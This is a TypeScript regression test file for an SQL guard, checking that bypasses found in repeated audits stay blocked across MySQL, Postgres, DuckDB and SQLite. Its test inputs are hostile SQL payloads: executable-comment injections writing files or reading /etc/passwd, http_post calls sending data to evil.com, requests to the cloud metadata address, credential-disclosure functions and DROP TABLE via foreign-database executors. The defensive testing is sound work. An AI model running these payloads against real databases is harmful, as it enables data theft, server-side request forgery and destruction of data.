/**
 * Regression tests for the guard bypasses found in the 2026-07 adversarial audit.
 * Each was CONFIRMED reproducible against the real guard before the fix. They must
 * stay blocked.
 */
import { describe, expect, it } from 'vitest';
import { guardSql } from '../src/guard.js';
import { POSTGRES_DIALECT, MYSQL_DIALECT, DUCKDB_DIALECT, SQLITE_DIALECT } from '../src/dialects.js';

const block = (sql: string, d = POSTGRES_DIALECT) => expect(guardSql({ sql, dialect: d }).allowed).toBe(false);
const allow = (sql: string, d = POSTGRES_DIALECT) => expect(guardSql({ sql, dialect: d }).allowed).toBe(true);

describe('MySQL executable comments /*! ... */ (critical)', () => {
  it.each([
    "SELECT * FROM users LIMIT 5 /*!INTO OUTFILE '/tmp/x'*/",
    "SELECT * FROM users /*!50000 INTO OUTFILE '/tmp/pwn'*/",
    "SELECT id FROM t WHERE id=1 /*!OR load_file('/etc/passwd') IS NOT NULL*/",
    'SELECT id FROM t WHERE id=1 /*!OR sleep(10)*/',
    "SELECT id FROM t WHERE id=1 /*!OR get_lock('l',10)*/",
    'SELECT * FROM t /*!50000 FOR UPDATE*/',
  ])('blocks %s', (sql) => block(sql, MYSQL_DIALECT));

  it('does not false-positive on /*! inside a string literal', () => {
    allow("SELECT id FROM t WHERE note = '/*!'", MYSQL_DIALECT);
  });
});

describe('DuckDB foreign-DB / scanner functions (critical)', () => {
  it.each([
    "SELECT postgres_execute('db','DROP TABLE t')",
    "SELECT mysql_execute('db','DROP TABLE t')",
    "SELECT * FROM sqlite_query('/etc/passwd','SELECT 1')",
    "SELECT * FROM postgres_query('db','SELECT 1')",
    "SELECT * FROM mysql_query('db','SELECT 1')",
    "SELECT * FROM postgres_scan('db','public','t')",
    "SELECT sqlite_attach('/tmp/x.db')",
    'SELECT * FROM duckdb_secrets()',
    "SELECT which_secret('s3://x','s3')",
  ])('blocks %s', (sql) => block(sql, DUCKDB_DIALECT));

  it('blocks unknown future *_scan / *_query / *_execute / *_attach via suffix rule', () => {
    block("SELECT * FROM newvendor_scan('x')", DUCKDB_DIALECT);
    block("SELECT newvendor_query('db','SELECT 1')", DUCKDB_DIALECT);
    block("SELECT newvendor_execute('db','DROP TABLE t')", DUCKDB_DIALECT);
    block("SELECT newvendor_attach('x')", DUCKDB_DIALECT);
  });

  it('still allows reading a registered table by name', () => {
    allow('SELECT count(*) FROM sales', DUCKDB_DIALECT);
  });
});

describe('Postgres write/side-effect functions (high)', () => {
  it.each([
    "SELECT lo_put(1,0,'x')",
    "SELECT lo_from_bytea(0,'x')",
    'SELECT lo_unlink(1)',
    "SELECT dblink_connect_u('h','host=169.254.169.254')",
    "SELECT dblink_open('c','SELECT 1')",
    "SELECT pg_drop_replication_slot('s')",
    "SELECT pg_create_logical_replication_slot('s','pgoutput')",
    'SELECT pg_stat_reset()',
    'SELECT pg_ls_waldir()',
    'SELECT pg_current_logfile()',
    'SELECT pg_export_snapshot()',
  ])('blocks %s', (sql) => block(sql));
});

describe('row-locking floor (medium)', () => {
  it('blocks MySQL LOCK IN SHARE MODE', () => block('SELECT * FROM t LOCK IN SHARE MODE', MYSQL_DIALECT));
  it('blocks FOR UPDATE', () => block('SELECT * FROM t FOR UPDATE'));
  it('allows a plain SELECT', () => allow("SELECT id, name FROM t WHERE region = 'EU'", MYSQL_DIALECT));
});

// Second audit round (Fable re-audit) found these denylist gaps.
describe('Postgres adminpack + server-control (critical/high)', () => {
  it.each([
    "SELECT pg_file_write('/tmp/x','data',false)",
    "SELECT pg_file_unlink('/tmp/x')",
    "SELECT pg_file_rename('/tmp/a','/tmp/b')",
    "SELECT pg_catalog.pg_file_write('/tmp/x','d',false)",
    "SELECT pg_replication_slot_advance('s','0/0')",
    'SELECT pg_wal_replay_pause()',
    "SELECT pg_start_backup('l')",
    'SELECT pg_stat_statements_reset()',
    'SELECT pg_logdir_ls()',
  ])('blocks %s', (sql) => block(sql));
});

describe('DuckDB network / external-read functions (high/medium)', () => {
  it.each([
    "SELECT http_post('http://evil.com','x','')",
    "SELECT http_get('http://169.254.169.254/latest/meta-data/')",
    "SELECT http_put('http://evil.com','x','')",
    "SELECT * FROM read_gsheet('https://docs.google.com/x')",
    "SELECT * FROM fsdir('/etc')",
  ])('blocks %s', (sql) => block(sql, DUCKDB_DIALECT));
});

describe('MySQL executable-comment false positive fixed', () => {
  it('allows /*! inside a -- line comment', () => allow('SELECT * FROM users -- /*! INTO OUTFILE', MYSQL_DIALECT));
  it('allows /*! inside a # line comment', () => allow('SELECT * FROM users # /*! x', MYSQL_DIALECT));
  it('still blocks a real executable comment', () =>
    block("SELECT * FROM t /*!INTO OUTFILE '/tmp/x'*/", MYSQL_DIALECT));
});

// Third audit round (Fable) - string-exec + more file readers + LO reads.
describe('DuckDB query() string-exec + spatial/aws (round 3)', () => {
  it.each([
    "SELECT * FROM query('SELECT * FROM read_csv(''/etc/hosts'')')",
    "SELECT query('DROP TABLE t')",
    "SELECT * FROM query_table('t')",
    "SELECT * FROM st_readosm('/etc/passwd')",
    "SELECT * FROM st_readshp('/etc/passwd')",
    'SELECT load_aws_credentials()',
  ])('blocks %s', (sql) => block(sql, DUCKDB_DIALECT));
});

describe('Postgres large-object READ aliases (round 3)', () => {
  it.each([
    'SELECT lo_get(1)',
    'SELECT lo_get_fragment(1,0,100)',
    'SELECT lo_read(0,100)',
    'SELECT pg_catalog.lo_get(1)',
  ])('blocks %s', (sql) => block(sql));
});

// Fourth audit round (Fable) - file-reader class closed structurally + replication.
describe('DuckDB read_/scan_ prefix rule closes the file-reader class (round 4)', () => {
  it.each([
    "SELECT * FROM read_avro('/etc/passwd')",
    "SELECT * FROM read_arrow('/x')",
    "SELECT * FROM scan_arrow_ipc('/x')",
    "SELECT * FROM read_somenewformat('/x')", // future reader extension
  ])('blocks %s', (sql) => block(sql, DUCKDB_DIALECT));
});

describe('Postgres replication consume/advance + SQLite fileio (round 4)', () => {
  it.each([
    "SELECT pg_logical_slot_get_changes('s',NULL,NULL)",
    "SELECT pg_logical_slot_get_binary_changes('s',NULL,NULL)",
    "SELECT pg_replication_origin_advance('o','0/0')",
  ])('blocks pg %s', (sql) => block(sql));
  it.each([
    "SELECT symlink('/etc/passwd','/tmp/x')",
    "SELECT mkdir('/tmp/x')",
    "SELECT name FROM zipfile('/tmp/x.zip')",
  ])('blocks sqlite %s', (sql) => block(sql, SQLITE_DIALECT));
});

// Fifth audit round (Fable) - prefix rules close pg_ls_ family; dialect-scoped duckdb settings.
describe('round 5: prefix rules + dialect-scoped denials', () => {
  it('blocks MySQL GTID replication waits', () => {
    block("SELECT wait_for_executed_gtid_set('x')", MYSQL_DIALECT);
    block("SELECT wait_until_sql_thread_after_gtids('x')", MYSQL_DIALECT);
  });
  it('blocks pg_ls_ family via prefix (incl. future members)', () => {
    block('SELECT pg_ls_summariesdir()');
    block('SELECT pg_ls_somenewdir()');
  });
  it('blocks DuckDB credential/setting disclosure + LLM functions', () => {
    block("SELECT current_setting('s3_secret_access_key')", DUCKDB_DIALECT);
    block('SELECT * FROM duckdb_settings()', DUCKDB_DIALECT);
    block("SELECT open_prompt('hi')", DUCKDB_DIALECT);
  });
  it('still allows Postgres current_setting (legit, dialect-scoped)', () => {
    allow("SELECT current_setting('search_path')");
    allow('SELECT current_database()');
  });
});
